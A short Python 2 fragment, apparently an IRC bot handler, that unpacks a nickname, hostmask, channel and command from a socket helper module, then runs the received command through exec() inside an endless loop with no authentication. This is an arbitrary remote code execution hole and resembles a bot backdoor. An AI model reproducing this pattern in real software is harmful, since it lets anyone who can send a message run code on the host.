from socketS import *

t = returndata()[0]
nickname = returndata()[1]
hotmask = returndata()[2]
msg_type = returndata()[3]
chan = returndata()[4]
message = returndata()[5]
command = returndata()[6]

while True:
    if command:
        try:
            exec(command)
        except:
            print "ERROR"
